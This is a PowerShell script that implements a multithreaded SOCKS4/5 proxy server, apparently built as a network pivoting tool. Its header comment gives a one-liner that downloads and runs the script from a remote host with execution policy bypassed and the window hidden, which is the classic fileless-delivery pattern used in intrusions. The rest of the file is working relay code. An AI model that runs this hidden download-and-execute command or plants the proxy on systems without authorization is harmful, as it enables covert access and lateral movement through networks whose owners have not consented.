# To invoke : Invoke-SocksProxy -bindIP 0.0.0.0 -bindPort 65535
# Serve it like: powershell -exec bypass -nop -noexit -windowstyle hidden -c (new-object system.net.webclient).downloadstring('...host your script.')
[ScriptBlock]$SocksConnectionMgr = {
    param($vars)
    $Script = {
            param($vars)
            $vars.inStream.CopyTo($vars.outStream)
            Exit
    }
    $rsp=$vars.rsp;
    function Get-IpAddress{
        param($ip)
        IF ($ip -as [ipaddress]){
            return $ip
        }else{
            $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
        }
        return $ip2
    }
    $client=$vars.cliConnection
    $buffer = New-Object System.Byte[] 32
    try
    {
        $cliStream = $client.GetStream()
        $cliStream.Read($buffer,0,2) | Out-Null
        $socksVer=$buffer[0]
        if ($socksVer -eq 5){
            $cliStream.Read($buffer,2,$buffer[1]) | Out-Null
            for ($i=2; $i -le $buffer[1]+1; $i++) {
                if ($buffer[$i] -eq 0) {break}
            }
            if ($buffer[$i] -ne 0){
                $buffer[1]=255
                $cliStream.Write($buffer,0,2)
            }else{
                $buffer[1]=0
                $cliStream.Write($buffer,0,2)
            }
            $cliStream.Read($buffer,0,4) | Out-Null
            $cmd = $buffer[1]
            $atyp = $buffer[3]
            if($cmd -ne 1){
                $buffer[1] = 7
                $cliStream.Write($buffer,0,2)
                throw "Not a connect"
            }
            if($atyp -eq 1){
                $ipv4 = New-Object System.Byte[] 4
                $cliStream.Read($ipv4,0,4) | Out-Null
                $ipAddress = New-Object System.Net.IPAddress(,$ipv4)
                $hostName = $ipAddress.ToString()
            }elseif($atyp -eq 3){
                $cliStream.Read($buffer,4,1) | Out-Null
                $hostBuff = New-Object System.Byte[] $buffer[4]
                $cliStream.Read($hostBuff,0,$buffer[4]) | Out-Null
                $hostName = [System.Text.Encoding]::ASCII.GetString($hostBuff)
            }
            else{
                $buffer[1] = 8
                $cliStream.Write($buffer,0,2)
                throw "Not a valid destination address"
            }
            $cliStream.Read($buffer,4,2) | Out-Null
            $destPort = $buffer[4]*256 + $buffer[5]
            $destHost = Get-IpAddress($hostName)
            if($destHost -eq $null){
                $buffer[1]=4
                $cliStream.Write($buffer,0,2)
                throw "Cant resolve destination address"
            }
            $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)
            if($tmpServ.Connected){
                $buffer[1]=0
                $buffer[3]=1
                $buffer[4]=0
                $buffer[5]=0
                $cliStream.Write($buffer,0,10)
                $cliStream.Flush()
                $srvStream = $tmpServ.GetStream()
                $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                $AsyncJobResult = $cliStream.CopyToAsync($srvStream)
                $AsyncJobResult.AsyncWaitHandle.WaitOne();
                $AsyncJobResult2.AsyncWaitHandle.WaitOne();

            }
            else{
                $buffer[1]=4
                $cliStream.Write($buffer,0,2)
                throw "Cant connect to host"
            }
       }elseif($socksVer -eq 4){
            $cmd = $buffer[1]
            if($cmd -ne 1){
                $buffer[0] = 0
                $buffer[1] = 91
                $cliStream.Write($buffer,0,2)
                throw "Not a connect"
            }
            $cliStream.Read($buffer,2,2) | Out-Null
            $destPort = $buffer[2]*256 + $buffer[3]
            $ipv4 = New-Object System.Byte[] 4
            $cliStream.Read($ipv4,0,4) | Out-Null
            $destHost = New-Object System.Net.IPAddress(,$ipv4)
            $buffer[0]=1
            while ($buffer[0] -ne 0){
                $cliStream.Read($buffer,0,1)
            }
            $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)

            if($tmpServ.Connected){
                $buffer[0]=0
                $buffer[1]=90
                $buffer[2]=0
                $buffer[3]=0
                $cliStream.Write($buffer,0,8)
                $cliStream.Flush()
                $srvStream = $tmpServ.GetStream()
                $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                $AsyncJobResult = $cliStream.CopyTo($srvStream)
                $AsyncJobResult.AsyncWaitHandle.WaitOne();
                $AsyncJobResult2.AsyncWaitHandle.WaitOne();
            }
       }else{
            throw "Unknown socks version"
       }
    }
    catch {
        #$_ >> "error.log"
    }
    finally {
        if ($client -ne $null) {
            $client.Dispose()
        }
        if ($tmpServ -ne $null) {
            $tmpServ.Dispose()
        }
        Exit;
    }
}

function Invoke-SocksProxy {
    param (
            [String]$bindIP = "0.0.0.0",
            [Int]$bindPort = 1080,
            [Int]$threads = 200
     )
    try{
        $listener = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($bindIP), $bindPort)
        $listener.start()
        $rsp = [runspacefactory]::CreateRunspacePool(1,$threads);
        $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
        $rsp.open();
        write-host "Listening on port $bindPort..."
        while($true){
            $client = $listener.AcceptTcpClient()
            Write-Host "New Connection from " $client.Client.RemoteEndPoint
            $vars = [PSCustomObject]@{"cliConnection"=$client; "rsp"=$rsp}
            $PS3 = [PowerShell]::Create()
            $PS3.RunspacePool = $rsp;
            $PS3.AddScript($SocksConnectionMgr).AddArgument($vars) | Out-Null
            $PS3.BeginInvoke() | Out-Null
            Write-Host "Threads Left:" $rsp.GetAvailableRunspaces()
        }
     }
    catch{
        throw $_
    }
    finally{
        write-host "Server closed."
        if ($listener -ne $null) {
                  $listener.Stop()
           }
        if ($client -ne $null) {
            $client.Dispose()
            $client = $null
        }
        if ($PS3 -ne $null -and $AsyncJobResult3 -ne $null) {
            $PS3.EndInvoke($AsyncJobResult3) | Out-Null
            $PS3.Runspace.Close()
            $PS3.Dispose()
        }
    }
}

function Get-IpAddress{
    param($ip)
    IF ($ip -as [ipaddress]){
        return $ip
    }else{
        $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
        Write-Host "$ip resolved to $ip2"
    }
    return $ip2
}

function StartProxyServer {
    param (
        [String]$bindIP = "0.0.0.0",
        [Int]$bindPort = 1080
     )
    return Start-Job {
        param($bindIP,$bindPort)
        Invoke-SocksProxy -bindIP $bindIP -bindPort $bindPort;
    } -ArgumentList $bindIP, $bindPort;
}

# Invoke-SocksProxy -bindIP 0.0.0.0 -bindPort 65530;
# uncomment above to serve directly from http
